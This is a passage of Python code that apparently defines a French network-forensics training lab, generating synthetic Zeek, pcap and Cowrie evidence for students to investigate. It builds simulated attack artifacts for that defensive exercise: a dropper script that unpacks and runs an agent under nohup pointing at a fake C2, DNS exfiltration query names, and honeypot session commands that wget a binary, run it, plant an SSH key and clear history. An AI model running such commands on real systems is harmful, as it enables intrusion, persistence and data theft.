"""Supervision de sécurité et investigation réseau : Zeek, analyse de capture, Cowrie.

The lab: a router `gw` between a WAN (`wan`, "the Internet": `attacker` for the students, the hidden
grader `probe`), a DMZ (`dmz`, a **hub**: `www`, the web and DNS server of `corp.lab`, and `honeypot`)
and an internal LAN (`lan`: `analyst`, the forensics workstation). The sensor `sensor` captures on the
DMZ hub (`eth1`, no address) and is managed from the LAN (`eth0`).

Parts (each independent, see the Organisation question):

1. the Zeek sensor (`sensor`, zeekctl): node.cfg on eth1, networks.cfg, JSON logs; graded on the live
   logs after HTTP and DNS requests of the probe and of `analyst`;
2. two Zeek scripts of `sensor` (a notice for a web scanner, counted with an expiring table; a notice for
   every connection the honeypot opens), graded **offline**: the grader writes a fresh capture into
   `sensor` (lib/suricata_pcap.py) and runs `zeek -r` with each script alone;
3. the investigation of a capture (`analyst`: /root/evidence/incident.pcap, made on the host side by
   lib/incident_pcap.py from a seed of the data): a scan, an HTTP password search, a dropper, a beacon to a
   C2 and a DNS exfiltration; graded by forms and by the extracted file;
4. Cowrie on `honeypot`: the real sshd moved to 22222 (lan only), Cowrie on 22 with a credible identity
   and a userdb; graded by SSH sessions of the probe (cowrie.json) and banners;
5. the correlation of yesterday's Cowrie log with the sensor's conn.log (`analyst`, generated); forms;
6. bonus: the Intel framework on `sensor`, graded offline with `--pseudo-realtime=1` and the site policy.

See lib/zeek.py, lib/cowrie.py, lib/incident_pcap.py.
"""
import base64
import hashlib
import json
import random
import shlex
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from ipaddress import IPv4Interface, IPv4Network
from typing import Dict, List, Optional
from urllib.parse import quote_plus, unquote_plus

from SRE import params
from SRE.lib_sre import (Data0, Grade0, NetScheme0, info_subtitle, info_toc, instructor, make_tr, no_tr,
                         sre_state)
from SRE.params import sre_docker_image
import cowrie as hp
import zeek
from incident_pcap import IncidentCapture, http_request_bytes, http_response_bytes
from ips import random_ipv4networks
from net_config import set_ip_forward
from openldap import install_login_probe
from suricata import get_epoch, install_pcap_tool, write_pcap
from tc import section_text
from tcp import parallel_cmd

default_language = 'fr'
tr = make_tr(default_language)

title = tr("Supervision de sécurité et investigation réseau : Zeek, analyse de capture, Cowrie",
           en="Network security monitoring and forensics: Zeek, a pcap investigation, Cowrie")
allow_self_grade = True
no_mark_on_self_grade = True
delay_between_self_grade = 30
allow_user_states = True
# The Kathara export would reveal the grader's hidden machine.
export_kathara_project = False
eval_interval_without_exam_mode = 300
eval_before_exit = True
record_sessions = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

NSM_INIT = {"image": sre_docker_image("nsm13"), "privileged": True, "entrypoint": "/sbin/init"}
NSM_PLAIN = {"image": sre_docker_image("nsm13")}
PLAIN_MACHINE = {"image": sre_docker_image("base13")}

_TOPOLOGY = {
    'wan': {'gw': 0, 'attacker': 0, 'probe': 0},
    'dmz': {'gw': 1, 'www': 0, 'honeypot': 0, 'sensor': 1},
    'lan': {'gw': 2, 'sensor': 0, 'analyst': 0},
}
#: data.ips key -> (network, host part)
ADDRESSES = {
    'gw_wan': ('wan', 1), 'attacker': ('wan', 66), 'probe': ('wan', 200),
    'gw_dmz': ('dmz', 1), 'www': ('dmz', 10), 'honeypot': ('dmz', 25),
    'gw_lan': ('lan', 1), 'sensor': ('lan', 5), 'analyst': ('lan', 10),
}
#: the source addresses of the probe (host parts in `wan`), one per check
PROBE_ROLES = {
    'zeek': 201,          # part 1: the HTTP and DNS requests seen by the sensor
    'honeypot': 202,      # part 4: the banners and the SSH sessions
}
INTEL_HOST = 166          # bonus: the "known malicious" address of the CERT (wan host part, never configured)
INCIDENT_FILES, INCIDENT_INTRANET = 30, 20     # dmz host parts of the servers of the incident capture

DOMAIN = "corp.lab"
SENSOR_IFACE = "eth1"
SCRIPT_DIR = f"{zeek.SITE_DIR}/sre"
WEB_SCAN_SCRIPT = f"{SCRIPT_DIR}/web-scan.zeek"
HONEYPOT_SCRIPT = f"{SCRIPT_DIR}/honeypot.zeek"
INTEL_FILE = f"{zeek.SITE_DIR}/intel.dat"
TRAINING_PCAP = "/root/pcap/training.pcap"        # on sensor: the cases of part 2
NOTE_WEB_SCAN = "SRE::Web_Scan"
NOTE_OUTBOUND = "SRE::Honeypot_Outbound"
JSON_LOAD = "@load policy/tuning/json-logs"
PRIVATE_NOT_LOCAL = "redef Site::private_address_space_is_local = F;"
INTEL_LOAD = "@load frameworks/intel/seen"
EVIDENCE = "/root/evidence"
INCIDENT_PCAP = f"{EVIDENCE}/incident.pcap"
EXTRACTED_DIR = f"{EVIDENCE}/extracted"
HISTORY_DIR = f"{EVIDENCE}/honeypot"
HISTORY_COWRIE = f"{HISTORY_DIR}/cowrie.json"
HISTORY_CONN = f"{HISTORY_DIR}/conn.log"
ADMIN_PORT = 22222
FAKE_BANNER = "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3"
SSHD_DROPIN = "/etc/ssh/sshd_config.d/admin-port.conf"
NFT_CONF = "/etc/nftables.conf"
WWW_ROOT = "/var/www/html"
DNSMASQ_HOSTS = "/etc/dnsmasq-corp.hosts"
LOGIN_PROBE = "/usr/local/sbin/sre_login_probe.py"
DEPLOY_LOG = "/var/log/sre-zeekctl-deploy.log"
#: seconds between the requests of the probe and the reading of the Zeek logs: a TCP connection is written
#: to conn.log once Zeek forgets it (5 s after the FIN exchange), then flushed
LOG_WAIT = 12

HOSTNAME_BASES = ("srv-backup", "srv-files", "nas", "db-prod", "erp", "git", "compta", "intranet-old")
ROOT_PASSWORDS = ("123456", "admin", "password", "toor", "qwerty", "root123", "changeme", "letmein", "1234",
                  "dragon", "welcome", "master")
SECOND_USERS = ("pi", "ubuntu", "oracle", "deploy", "git", "test", "ftpuser", "hadoop")
SECOND_REFUSED = ("raspberry", "ubuntu", "oracle", "deploy", "123456", "password", "changeme", "test")
UNKNOWN_USERS = ("guest", "support", "backup", "postgres", "nagios", "user")
WORDS = ("ORION", "SIRIUS", "VEGA", "ALTAIR", "RIGEL", "DENEB", "CASTOR", "POLLUX", "ANTARES", "CAPELLA",
         "PROCYON", "MIRA")
C2_BASES = ("stats-sync", "cdn-update", "telemetry-hub", "metrics-relay", "pkg-cache", "geo-lookup", "api-check")
EXFIL_BASES = ("dns-sync", "cloud-backup", "tunnel-svc", "data-relay", "resolve-cdn", "edge-resolver")
INTEL_BASES = ("bad-updates", "free-codecs", "login-verify", "secure-docs", "invoice-view", "parcel-track")
ACCOUNTS = ("admin", "webmaster", "j.martin", "compta", "rh-gestion", "support")
WORDLIST = ("123456", "password", "azerty", "qwerty", "admin", "admin123", "motdepasse", "bonjour", "soleil",
            "marseille", "iloveyou", "princesse", "loulou", "doudou", "chouchou", "123456789", "000000",
            "football", "nicolas", "camille", "julien", "sophie", "isabelle", "jetaime", "coucou", "nathalie",
            "chocolat", "patrick", "stephane", "celine", "Password1", "Azerty123", "Welcome1", "Admin2026")
FOUND_PASSWORDS = ("Soleil2026!", "Azerty2026!", "Printemps26!", "Marseille13!", "Bonjour2026", "Chocolat#26")
SITES = (("news.example.com", "192.0.2.10"), ("cdn.example.net", "192.0.2.20"), ("wiki.example.org", "198.51.100.30"),
         ("meteo.example.fr", "198.51.100.40"), ("mail.example.org", "198.51.100.50"),
         ("shop.example.com", "192.0.2.60"), ("docs.example.net", "192.0.2.70"), ("maps.example.org", "198.51.100.80"))
PAGES = ("/", "/index.html", "/actualites", "/article/2026/11/rapport", "/static/app.js", "/static/style.css",
         "/images/logo.png", "/api/v1/status", "/recherche?q=reseau", "/contact")
BROWSERS = ("Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/131.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36")
BEACON_UA = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
HYDRA_UA = "Mozilla/5.0 (Hydra)"
SCAN_PORTS = (21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 389, 443, 445, 465, 587, 631, 993, 995, 1433,
              1521, 2049, 2222, 3306, 3389, 5000, 5432, 5900, 6379, 7001, 8000, 8080, 8081, 8443, 8888, 9000,
              9200, 10000, 11211, 27017)
SCAN_OPEN_POOL = (21, 22, 80, 139, 443, 445, 3306, 5432, 6379, 8080)
CLIENT_VERSIONS = ("SSH-2.0-Go", "SSH-2.0-libssh_0.9.6", "SSH-2.0-libssh2_1.10.0", "SSH-2.0-PuTTY_Release_0.81",
                   "SSH-2.0-paramiko_3.4.0", "SSH-2.0-AsyncSSH_2.14.2", "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10")
ATTACK_USERS = ("root", "admin", "test", "oracle", "ubuntu", "user", "pi", "postgres", "git", "ftp", "guest")
BIN_NAMES = ("kworker", "sshd-upd", "x86_64", "dbus-helper", "systemd-net", "cron-daily")
KEY_USERS = ("root", "admin", "x", "kali", "op")
KEY_HOSTS = ("vps", "kali", "srv", "box", "node")
UID_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"


# ---------------------------------------------------------------------------
# Data
# ---------------------------------------------------------------------------


@dataclass(slots=True)
class Data(Data0):
    token: str = ""                                    # part 1: the name and page the probe asks for
    scan_threshold: int = 0                            # part 2: the 404 count of a web scanner
    honeypot: dict = field(default_factory=dict)       # part 4: the identity and the accounts of Cowrie
    intel: dict = field(default_factory=dict)          # bonus: the CERT's indicators
    incident: dict = field(default_factory=dict)       # part 3: the parameters and answers of the capture
    history: dict = field(default_factory=dict)        # part 5: the parameters and answers of the history

    @classmethod
    def generate(cls):
        data = cls()
        rnd = random.Random()
        wan = random_ipv4networks(masks=[24], from_network=IPv4Network("198.18.0.0/15"))[0]
        dmz, lan = random_ipv4networks(masks=[24, 24], from_private_network=True,
                                       exclude=[IPv4Network("172.17.0.0/16"), IPv4Network("10.0.0.0/16")])
        for name, net in (('wan', wan), ('dmz', dmz), ('lan', lan)):
            setattr(data.nets, name, net)
        for key, (net, host) in ADDRESSES.items():
            n = getattr(data.nets, net)
            setattr(data.ips, key, IPv4Interface(f"{n.network_address + host}/{n.prefixlen}"))
        data.token = f"{rnd.choice(WORDS).lower()}{rnd.randint(100, 999)}"
        data.scan_threshold = rnd.randint(6, 12)
        root = rnd.sample(ROOT_PASSWORDS, 4)
        user2 = rnd.choice(SECOND_USERS)
        data.honeypot = {
            "hostname": f"{rnd.choice(HOSTNAME_BASES)}-{rnd.randint(1, 9):02d}",
            "sensor": f"hp-dmz-{rnd.randint(10, 99)}",
            "kernel": f"5.10.0-{rnd.randint(20, 35)}-amd64",
            "root_passwords": root[:3],
            "root_refused": root[3],
            "user2": user2,
            "user2_refused": rnd.choice(SECOND_REFUSED),
            "user2_try": f"{rnd.choice(WORDS).capitalize()}{rnd.randint(10, 99)}",
            "unknown": rnd.choice(UNKNOWN_USERS),
            "unknown_password": f"{rnd.choice(WORDS).lower()}{rnd.randint(1000, 9999)}",
        }
        kind = rnd.choice(('setup', 'codec', 'invoice', 'update'))
        data.intel = {"domain": f"{rnd.choice(INTEL_BASES)}-{rnd.randint(10, 99)}.example",
                      "path": f"/download/{kind}-{rnd.randint(100, 999)}.exe"}
        data.incident = make_incident(rnd.randint(1, 10 ** 9), data)
        data.history = make_history(rnd.randint(1, 10 ** 9), data)
        return data


def wan_addr(d, host: int) -> str:
    return str(d.nets.wan.network_address + host)


def role_addr(d, role: str) -> str:
    return wan_addr(d, PROBE_ROLES[role])


def dmz_addr(d, host: int) -> str:
    return str(d.nets.dmz.network_address + host)


def intel_indicators(d) -> List[tuple]:
    """The bonus indicators: (indicator, type, where it is seen)."""
    return [(d.intel["domain"], "Intel::DOMAIN", "DNS::IN_REQUEST"),
            (wan_addr(d, INTEL_HOST), "Intel::ADDR", "Conn::IN_ORIG"),
            (f"www.{DOMAIN}{d.intel['path']}", "Intel::URL", "HTTP::IN_URL")]


# ---------------------------------------------------------------------------
# Part 3: the incident capture
# ---------------------------------------------------------------------------


def make_incident(seed: int, d) -> dict:
    """The parameters (and the answers) of the incident capture, drawn from *seed*."""
    rnd = random.Random(seed)
    day = (datetime.now(timezone.utc) - timedelta(days=rnd.randint(3, 6))).replace(hour=8, minute=0, second=0,
                                                                                   microsecond=0)
    lan, wan = d.nets.lan, d.nets.wan
    workstations = [str(lan.network_address + h) for h in rnd.sample(range(21, 60), 5)]
    code = f"{rnd.choice(WORDS)}-{rnd.randint(1000, 9999)}"
    inc = {
        "seed": seed,
        "start": day.timestamp() + rnd.randint(30, 150) * 60,
        "scanner": str(wan.network_address + rnd.choice([h for h in range(100, 190) if h != INTEL_HOST])),
        "files": dmz_addr(d, INCIDENT_FILES),
        "intranet": dmz_addr(d, INCIDENT_INTRANET),
        "resolver": str(d.ips.gw_lan.ip),
        "workstations": workstations,
        "victim": workstations[rnd.randrange(len(workstations))],
        "open_ports": sorted(rnd.sample(SCAN_OPEN_POOL, rnd.randint(3, 5))),
        "account": rnd.choice(ACCOUNTS),
        "wordlist": rnd.sample(WORDLIST, rnd.randint(18, 26)),
        "password": rnd.choice(FOUND_PASSWORDS),
        "dropper": f"maj-securite-{rnd.randint(100, 999)}.sh",
        "c2_domain": f"{rnd.choice(C2_BASES)}{rnd.randint(10, 99)}.example",
        "c2_ip": f"203.0.113.{rnd.randint(10, 250)}",
        "period": rnd.randint(30, 75),
        "beacons": rnd.randint(10, 13),
        "exfil_domain": f"{rnd.choice(EXFIL_BASES)}{rnd.randint(10, 99)}.example",
        "code": code,
        "secret": f"fichier=paie-2026.xlsx;code={code};dest=archive",
        "hostid": "%012x" % rnd.getrandbits(48),
        "agent_seed": rnd.getrandbits(32),
        "cookie": "%032x" % rnd.getrandbits(128),
    }
    inc["sha256"] = hashlib.sha256(dropper_bytes(inc)).hexdigest()
    return inc


def dropper_bytes(inc: dict) -> bytes:
    """The shell dropper of the capture (a few kB: several TCP segments; the payload is random bytes)."""
    rnd = random.Random(inc["agent_seed"])
    blob = base64.encodebytes(rnd.randbytes(4096 + rnd.randint(0, 2048))).decode()
    work = f"/tmp/.cache-{inc['hostid'][:6]}"
    return ("#!/bin/sh\n# Mise a jour de securite - ne pas interrompre\n"
            f"C2=\"http://{inc['c2_domain']}/api/v2\"\n"
            "ID=$(hostname | md5sum | cut -c1-12)\n"
            f"mkdir -p {work}\n"
            f"base64 -d > {work}/agent <<'EOF'\n{blob}EOF\n"
            f"chmod +x {work}/agent\n"
            f"nohup {work}/agent --c2 \"$C2\" --id \"$ID\" >/dev/null 2>&1 &\n").encode()


def exfil_names(inc: dict) -> List[str]:
    """The names asked to exfiltrate the secret: 16 bytes in hex per query, a sequence number."""
    data = inc["secret"].encode().hex()
    chunks = [data[i:i + 32] for i in range(0, len(data), 32)]
    return [f"{chunk}.{i}.{inc['exfil_domain']}" for i, chunk in enumerate(chunks)]


def _page(rnd: random.Random, title_text: str) -> bytes:
    words = ("reseau", "securite", "rapport", "annuel", "service", "client", "projet", "equipe", "donnees")
    body = " ".join(rnd.choice(words) for _ in range(rnd.randint(40, 600)))
    return f"<html><head><title>{title_text}</title></head><body><p>{body}</p></body></html>\n".encode()


def build_incident_pcap(d) -> bytes:
    """The incident capture of *d* (deterministic)."""
    inc = d.incident
    rnd = random.Random(inc["seed"] + 1)
    cap = IncidentCapture()
    t0 = inc["start"]
    resolver, intranet = inc["resolver"], inc["intranet"]
    victim, scanner = inc["victim"], inc["scanner"]
    ports = {}
    qids = [rnd.randint(1000, 60000)]

    def cport(host):
        ports[host] = ports.get(host, rnd.randint(33000, 52000)) + rnd.randint(1, 7)
        return ports[host]

    def qid():
        qids[0] = (qids[0] * 1103515245 + 12345) % 65536 or 1
        return qids[0]

    def lookup(t, host, name, answers=(), rcode=0):
        return cap.dns(t, host, cport(host), resolver, name, qid(), answers, rcode)

    ua_of = {ws: BROWSERS[i % len(BROWSERS)] for i, ws in enumerate(inc["workstations"])}
    first_beacon = t0 + 338.0
    duration = 360 + inc["period"] * (inc["beacons"] + 2)
    sites = list(SITES) + [(f"www.{DOMAIN}", str(d.ips.www.ip)), (f"intranet.{DOMAIN}", intranet)]

    # background: the workstations browse (a DNS lookup, then the page)
    for _ in range(70):
        t = t0 + rnd.uniform(0, duration)
        host = rnd.choice(inc["workstations"])
        name, ip = rnd.choice(sites)
        t = lookup(t, host, name, [ip]) + 0.01
        page = rnd.choice(PAGES)
        status = 404 if rnd.random() < 0.06 else 200
        body = _page(rnd, name) if status == 200 else b"<html><body>Not Found</body></html>\n"
        cap.http(t, host, cport(host), ip, http_request_bytes("GET", page, name, ua_of[host]),
                 http_response_bytes(status, body))
    for _ in range(4):           # mistyped names
        t = t0 + rnd.uniform(0, duration)
        host = rnd.choice(inc["workstations"])
        lookup(t, host, rnd.choice(("wikki.example.org", "nwes.example.com", "intarnet.corp.lab")), rcode=3)

    # the SYN scan of files
    scan_ports = list(SCAN_PORTS)
    rnd.shuffle(scan_ports)
    cap.scan(t0 + 60.0, scanner, inc["files"], scan_ports, inc["open_ports"], sport=rnd.randint(40000, 60000))

    # the password search on the intranet's login form, then the access and the upload
    t = t0 + 150.0
    login_headers = [("Content-Type", "application/x-www-form-urlencoded")]
    for pw in list(inc["wordlist"]) + [inc["password"]]:
        body = f"user={quote_plus(inc['account'])}&password={quote_plus(pw)}".encode()
        if pw == inc["password"]:
            response = http_response_bytes(302, b"", headers=[("Location", "/accueil"),
                                                              ("Set-Cookie", f"session={inc['cookie']}; HttpOnly")])
        else:
            response = http_response_bytes(401, "Identifiants incorrects\n".encode(), ctype="text/plain")
        cap.http(t, scanner, cport(scanner), intranet,
                 http_request_bytes("POST", "/login", f"intranet.{DOMAIN}", HYDRA_UA, login_headers, body), response)
        t += rnd.uniform(1.6, 2.6)
    cookie = [("Cookie", f"session={inc['cookie']}")]
    cap.http(t + 8.0, scanner, cport(scanner), intranet,
             http_request_bytes("GET", "/accueil", f"intranet.{DOMAIN}", HYDRA_UA, cookie),
             http_response_bytes(200, _page(rnd, "Accueil")))
    boundary = "----sre" + inc["hostid"]
    dropper = dropper_bytes(inc)
    form = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"fichier\"; filename=\"{inc['dropper']}\"\r\n"
            f"Content-Type: application/x-sh\r\n\r\n").encode() + dropper + f"\r\n--{boundary}--\r\n".encode()
    cap.http(t + 31.0, scanner, cport(scanner), intranet,
             http_request_bytes("POST", "/admin/upload", f"intranet.{DOMAIN}", HYDRA_UA,
                                cookie + [("Content-Type", f"multipart/form-data; boundary={boundary}")], form),
             http_response_bytes(200, b"<html><body>Fichier depose.</body></html>\n"))

    # the victim downloads the dropper
    t = lookup(t0 + 330.0, victim, f"intranet.{DOMAIN}", [intranet]) + 0.01
    cap.http(t, victim, cport(victim), intranet,
             http_request_bytes("GET", f"/uploads/{inc['dropper']}", f"intranet.{DOMAIN}", "Wget/1.25.0"),
             http_response_bytes(200, dropper, ctype="application/x-sh"))

    # the beacon to the C2, then the DNS exfiltration
    lookup(first_beacon - 2.0, victim, inc["c2_domain"], [inc["c2_ip"]])
    for i in range(inc["beacons"]):
        t = first_beacon + i * inc["period"] + rnd.uniform(-0.2, 0.2)
        cap.http(t, victim, cport(victim), inc["c2_ip"],
                 http_request_bytes("GET", f"/api/v2/ping?id={inc['hostid']}", inc["c2_domain"], BEACON_UA),
                 http_response_bytes(200, b"OK\n", ctype="text/plain", server="Apache"))
    t = first_beacon + 3.5 * inc["period"]
    for name in exfil_names(inc):
        lookup(t, victim, name, rcode=3)
        t += rnd.uniform(1.2, 2.0)
    return cap.pcap()


# ---------------------------------------------------------------------------
# Part 5: the honeypot's history (Cowrie and Zeek)
# ---------------------------------------------------------------------------


def make_history(seed: int, d) -> dict:
    """The parameters of yesterday's history of the honeypot, with its answers."""
    rnd = random.Random(seed)
    day = (datetime.now(timezone.utc) - timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
    pool = ([f"192.0.2.{h}" for h in range(2, 255)] + [f"198.51.100.{h}" for h in range(2, 255)]
            + [f"203.0.113.{h}" for h in range(2, 255)])
    picked = rnd.sample(pool, 13)
    count = rnd.randint(7, 9)
    h = {"seed": seed, "start": day.timestamp(), "sensor": f"hp-prod-{rnd.randint(1, 9):02d}",
         "attackers": picked[:count], "scanners": picked[count:count + 2], "malhost": picked[12]}
    h["answers"] = build_history(h, d)[2]
    return h


def _uid(rnd: random.Random) -> str:
    return "C" + "".join(rnd.choice(UID_CHARS) for _ in range(17))


def build_history(h: dict, d):
    """``(cowrie events, conn.log entries, answers)`` of the history *h* (deterministic)."""
    rnd = random.Random(h["seed"] + 7)
    hp_ip, www = str(d.ips.honeypot.ip), str(d.ips.www.ip)
    sensor = h["sensor"]
    attackers = list(h["attackers"])
    top, main = attackers[0], attackers[1]
    recon = set(attackers[2:4])
    versions = {ip: rnd.choice(CLIENT_VERSIONS) for ip in attackers}
    day0 = h["start"]
    fails = {top: rnd.randint(70, 95)}
    for ip in attackers[1:]:
        fails[ip] = rnd.randint(2, 30)
    bin_name = rnd.choice(BIN_NAMES)
    payload = rnd.randbytes(rnd.randint(30000, 90000))
    sha = hashlib.sha256(payload).hexdigest()
    url = f"http://{h['malhost']}/bins/{bin_name}"
    key_comment = f"{rnd.choice(KEY_USERS)}@{rnd.choice(KEY_HOSTS)}{rnd.randint(10, 99)}"
    key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI" + base64.b64encode(rnd.randbytes(32)).decode().rstrip("=")
    main_pw = rnd.choice(ROOT_PASSWORDS)

    # the sessions: (start, ip, failures, success password or None, commands)
    sessions = []
    per = fails[top] // 4
    for i in range(4):
        n = per if i < 3 else fails[top] - 3 * per
        sessions.append([day0 + rnd.uniform(1, 22) * 3600, top, n, None, []])
    for ip in attackers[1:]:
        n = fails[ip]
        if ip == main:
            cmds = ["uname -a", "cat /proc/cpuinfo | grep name | wc -l", f"cd /tmp; wget {url}",
                    f"chmod +x {bin_name}; ./{bin_name}", "mkdir -p ~/.ssh",
                    f"echo \"{key} {key_comment}\" >> ~/.ssh/authorized_keys", "history -c"]
            sessions.append([day0 + rnd.uniform(9, 20) * 3600, ip, n, main_pw, cmds])
        elif ip in recon:
            sessions.append([day0 + rnd.uniform(1, 22) * 3600, ip, n, rnd.choice(ROOT_PASSWORDS),
                             ["uname -a", "w", "free -m"]])
        else:
            first_n = n // 2
            sessions.append([day0 + rnd.uniform(1, 11) * 3600, ip, first_n, None, []])
            sessions.append([day0 + rnd.uniform(12, 22) * 3600, ip, n - first_n, None, []])
    for ip in h["scanners"]:
        sessions.append([day0 + rnd.uniform(1, 22) * 3600, ip, -1, None, []])
    sessions.sort(key=lambda s: s[0])

    events, conns = [], []
    answers = {}
    for start, ip, n, password, cmds in sessions:
        sid = "%012x" % rnd.getrandbits(48)
        sport = rnd.randint(32768, 60999)
        t = start
        ev = lambda eventid, ts, **f: events.append(hp.cowrie_event(eventid, ts, sid, ip, sensor, **f))  # noqa: E731
        ev("cowrie.session.connect", t, message=f"New connection: {ip}:{sport} ({hp_ip}:2222) [session: {sid}]",
           src_port=sport, dst_ip=hp_ip, dst_port=2222, protocol="ssh")
        if n < 0:                                  # a banner grab: connect, version, close
            version = "SSH-2.0-Nmap-SSH2-Hostkey"
            ev("cowrie.client.version", t + 0.05, version=version, message=f"Remote SSH version: {version}")
            t += 0.3
            ev("cowrie.session.closed", t, duration=0.3, message="Connection lost after 0.3 seconds")
            conns.append(_conn(rnd, start, ip, sport, hp_ip, 22, 0.3, 40, 300, "ssh", "ShAdDaFf", False, True))
            continue
        ev("cowrie.client.version", t + 0.05, version=versions[ip], message=f"Remote SSH version: {versions[ip]}")
        ev("cowrie.client.kex", t + 0.1, hassh="%032x" % rnd.getrandbits(128), message="SSH client hassh fingerprint")
        t += 0.4
        for _ in range(n):
            user = rnd.choice(ATTACK_USERS)
            pw = rnd.choice(WORDLIST)
            if user == "root" and pw == password:
                pw = pw + "1"
            ev("cowrie.login.failed", t, username=user, password=pw, message=f"login attempt [{user}/{pw}] failed")
            t += rnd.uniform(0.8, 2.4)
        if password is not None:
            ev("cowrie.login.success", t, username="root", password=password,
               message=f"login attempt [root/{password}] succeeded")
            t += 1.5
            ev("cowrie.session.params", t, arch="linux-x64-lsb", message="")
            for cmd in cmds:
                t += rnd.uniform(2.0, 9.0)
                ev("cowrie.command.input", t, input=cmd, message=f"CMD: {cmd}")
                if cmd.endswith(url):
                    out_sport = rnd.randint(40000, 60000)
                    conns.append(_conn(rnd, t + 0.05, hp_ip, out_sport, h["malhost"], 80, 0.4, 160,
                                       len(payload) + 260, "http", "ShADadfF", True, False))
                    answers["out_uid"] = conns[-1]["uid"]
                    t += 0.6
                    ev("cowrie.session.file_download", t, url=url, outfile=f"var/lib/cowrie/downloads/{sha}",
                       shasum=sha, destfile=f"/tmp/{bin_name}", duplicate=False,
                       message=f"Downloaded URL ({url}) with SHA-256 {sha} to var/lib/cowrie/downloads/{sha}")
            ev("cowrie.log.closed", t + 1.0, ttylog=f"var/lib/cowrie/tty/{'%064x' % rnd.getrandbits(256)}",
               size=rnd.randint(400, 9000), duration=round(t + 1.0 - start, 1), message="Closing TTY Log")
        t += 1.2
        duration = round(t - start, 1)
        ev("cowrie.session.closed", t, duration=duration, message=f"Connection lost after {duration} seconds")
        entry = _conn(rnd, start - 0.002, ip, sport, hp_ip, 22, duration + 0.01, 900 + 140 * max(n, 1) + 90 * len(cmds),
                      1300 + 110 * max(n, 1) + 260 * len(cmds), "ssh", "ShAdDaFf", False, True)
        conns.append(entry)
        if ip == main:
            answers["ssh_uid"] = entry["uid"]
            answers["session"] = sid
    # the noise of the DMZ: browsers to www, refused telnet attempts to the honeypot
    for _ in range(40):
        t = day0 + rnd.uniform(1, 23) * 3600
        client = str(d.nets.lan.network_address + rnd.randint(20, 80))
        conns.append(_conn(rnd, t, client, rnd.randint(33000, 60000), www, 80, rnd.uniform(0.01, 2.0),
                           rnd.randint(300, 900), rnd.randint(400, 60000), "http", "ShADadfF", True, True))
    for ip in rnd.sample(attackers, 4):
        t = day0 + rnd.uniform(1, 23) * 3600
        conns.append(_conn(rnd, t, ip, rnd.randint(33000, 60000), hp_ip, rnd.choice((23, 2323)), 0.0,
                           0, 0, None, "Sr", False, True, state="REJ"))
    conns.sort(key=lambda c: c["ts"] + (c.get("duration") or 0.0))
    answers.update({
        "n_ips": len(attackers), "top_ip": top, "top_version": versions[top],
        "url": url, "sha256": sha, "key_comment": key_comment,
    })
    return events, conns, answers


def _conn(rnd, ts, orig, orig_p, resp, resp_p, duration, orig_bytes, resp_bytes, service, history,
          local_orig, local_resp, state="SF") -> dict:
    """One conn.log entry as the sensor writes it (JSON keys)."""
    entry = {"ts": round(ts, 6), "uid": _uid(rnd), "id.orig_h": orig, "id.orig_p": orig_p, "id.resp_h": resp,
             "id.resp_p": resp_p, "proto": "tcp"}
    if service:
        entry["service"] = service
    if state != "REJ":
        entry.update({"duration": round(duration, 6), "orig_bytes": orig_bytes, "resp_bytes": resp_bytes})
    entry.update({"conn_state": state, "local_orig": local_orig, "local_resp": local_resp, "missed_bytes": 0,
                  "history": history, "orig_pkts": max(1, orig_bytes // 120), "resp_pkts": max(1, resp_bytes // 400)})
    return entry


# ---------------------------------------------------------------------------
# Part 2 and bonus: the offline captures (suricata_pcap specs)
# ---------------------------------------------------------------------------


def _http(src, dst, sport, uri, status, at, host="www", dport=80, ua="curl/8.14.1") -> dict:
    return {"kind": "http", "src": src, "dst": dst, "sport": sport, "dport": dport, "uri": uri, "host": host,
            "ua": ua, "status": status, "at": at}


def web_scan_cases(d, variant: int = 1) -> Dict[str, dict]:
    """Part 2, web-scan.zeek: case -> (source, count, status, interval). *variant* 0 = the training capture."""
    n = d.scan_threshold
    base = (130, 110)[variant]
    names = ("fast", "exact", "below", "ok200", "slow")
    shape = {"fast": (n + 3, 404, 1.0), "exact": (n, 404, 1.0), "below": (n - 1, 404, 1.0),
             "ok200": (n + 3, 200, 1.0), "slow": (n, 404, 40.0)}
    return {name: {"src": wan_addr(d, base + i), "count": shape[name][0], "status": shape[name][1],
                   "interval": shape[name][2]} for i, name in enumerate(names)}


def web_scan_spec(d, variant: int = 1) -> dict:
    www = str(d.ips.www.ip)
    events = []
    for i, (name, case) in enumerate(web_scan_cases(d, variant).items()):
        for k in range(case["count"]):
            events.append(_http(case["src"], www, 40000 + 100 * i + k + 1000 * variant,
                                f"/{('admin', 'wp')[variant]}{k}.php", case["status"], 0.3 * i + k * case["interval"]))
    return {"start": 1764000000.0 + 86400 * variant, "events": events}


def honeypot_spec(d, variant: int = 1) -> dict:
    hp_ip, www = str(d.ips.honeypot.ip), str(d.ips.www.ip)
    attacker = wan_addr(d, (150, 120)[variant])
    other = str(d.nets.lan.network_address + (60, 61)[variant])
    events = [
        _http(hp_ip, www, 41000 + variant, f"/tools/{('a', 'b')[variant]}.sh", 200, 1.0),       # outbound tcp
        {"kind": "dns", "src": hp_ip, "dst": www, "sport": 53001 + variant,
         "qname": f"{('update', 'mirror')[variant]}.example.org", "at": 2.0},                    # outbound udp
        _http(attacker, hp_ip, 42000 + variant, "/", 200, 3.0, host="x", dport=22, ua="x"),                 # inbound
        {"kind": "syn", "src": attacker, "dst": hp_ip, "dport": 22, "count": 2, "interval": 0.5,
         "sport": 43000 + 10 * variant, "at": 4.0},                                                         # inbound
